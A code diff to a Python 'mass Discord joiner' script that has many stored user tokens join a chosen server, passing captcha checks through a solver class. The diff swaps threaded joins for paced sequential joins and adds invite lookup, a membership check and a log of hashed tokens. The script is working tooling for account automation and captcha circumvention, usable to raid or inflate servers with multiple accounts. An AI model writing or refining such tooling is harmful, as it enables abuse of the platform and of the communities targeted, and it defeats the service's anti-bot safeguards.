@@ -12,6 +12,8 @@ import json
 import threading
 import requests
 from pathlib import Path
+import hashlib
+from datetime import datetime
 
 # Load .env
 try:
@@ -52,6 +54,16 @@ def resolve_invite(invite):
             invite = invite.split(p)[1].split()[0].split("/")[0]
             break
     return invite.split("/")[-1].split("?")[0]
+
+
+def fetch_invite_info(invite_code):
+    try:
+        r = requests.get(f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true", timeout=10)
+        if r.status_code == 200:
+            return r.json()
+    except Exception:
+        pass
+    return None
 
 def join_server(token, invite_code, solver):
     username = get_username(token)
@@ -114,38 +126,103 @@ def main():
     if not TOKENS:
         print("[!] No DISCORD_TOKENS in environment")
         sys.exit(1)
-    
+
     print("  ╔══════════════════════════════════════╗")
     print("  ║       MASS DISCORD JOINER           ║")
     print("  ╚══════════════════════════════════════╝")
-    
+
     invite = input("Invite code/URL: ").strip() or sys.exit()
     code = resolve_invite(invite)
-    print(f"  Code: {code} | Tokens: {len(TOKENS)}")
-    
-    confirm = input(f"Join {len(TOKENS)} token(s)? (y/N): ").strip().lower()
+    info = fetch_invite_info(code)
+    guild_id = None
+    if info:
+        guild = info.get('guild') or {}
+        guild_id = guild.get('id')
+        print(f"  Code: {code} | Guild: {guild.get('name','unknown')} | Tokens: {len(TOKENS)}")
+    else:
+        print(f"  Code: {code} | Tokens: {len(TOKENS)}")
+
+    confirm = input(f"Prepare to process {len(TOKENS)} token(s)? (y/N): ").strip().lower()
     if confirm != 'y':
+        print("Aborted.")
         return
-    
+
+    # Load or create log
+    log_path = Path(__file__).parent / 'mass_join_log.json'
+    try:
+        if log_path.exists():
+            log = json.loads(log_path.read_text())
+        else:
+            log = {}
+    except Exception:
+        log = {}
+
+    invite_log = log.get(code, {})
+
     solver = CaptchaSolver()
-    results = [False] * len(TOKENS)
-    
-    def _join(i, t):
-        results[i] = join_server(t, code, solver)
-    
-    threads = []
-    for i, token in enumerate(TOKENS):
-        t = threading.Thread(target=_join, args=(i, token))
-        threads.append(t)
-        t.start()
-        time.sleep(random.uniform(1.5, 3.5))
-    
-    for t in threads:
-        t.join(timeout=180)
-    
-    success = sum(1 for r in results if r)
-    print(f"\n  ✅ {success}/{len(TOKENS)} joined")
-    print(f"  ❌ {len(TOKENS)-success}/{len(TOKENS)} failed")
+
+    success = 0
+    failed = 0
+
+    for token in TOKENS:
+        # compute token hash to avoid storing raw token
+        token_hash = hashlib.sha256(token.encode()).hexdigest()
+        username = get_username(token)
+
+        # Check log: if this token hash already recorded as joined for this invite
+        if token_hash in invite_log:
+            entry = invite_log[token_hash]
+            print(f"[{username}] ▶ Already recorded as joined at {entry.get('joined_at')}")
+            success += 1
+            # wait 10s before next token
+            time.sleep(10)
+            continue
+
+        # If possible, check membership via /users/@me/guilds
+        already_member = False
+        if guild_id:
+            try:
+                headers = {**HEADERS_TEMPLATE, 'Authorization': token}
+                r = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=10)
+                if r.status_code == 200:
+                    guilds = r.json()
+                    if any(g.get('id') == guild_id for g in guilds):
+                        already_member = True
+            except Exception:
+                pass
+
+        if already_member:
+            print(f"[{username}] ✅ Already a member of the guild")
+            invite_log[token_hash] = {'username': username, 'joined_at': datetime.utcnow().isoformat()}
+            success += 1
+            # write log incrementally
+            log[code] = invite_log
+            try:
+                log_path.write_text(json.dumps(log, indent=2))
+            except Exception:
+                pass
+            time.sleep(10)
+            continue
+
+        # Do not massjoin immediately: perform join with 10s delay between tokens
+        print(f"[{username}] Waiting 10s before attempting join...")
+        time.sleep(10)
+        joined = join_server(token, code, solver)
+        if joined:
+            invite_log[token_hash] = {'username': username, 'joined_at': datetime.utcnow().isoformat()}
+            success += 1
+        else:
+            failed += 1
+
+        # persist log after each token
+        log[code] = invite_log
+        try:
+            log_path.write_text(json.dumps(log, indent=2))
+        except Exception:
+            pass
+
+    print(f"\n  ✅ {success}/{len(TOKENS)} joined (recorded)")
+    print(f"  ❌ {failed}/{len(TOKENS)} failed")
 
 
 if __name__ == "__main__":
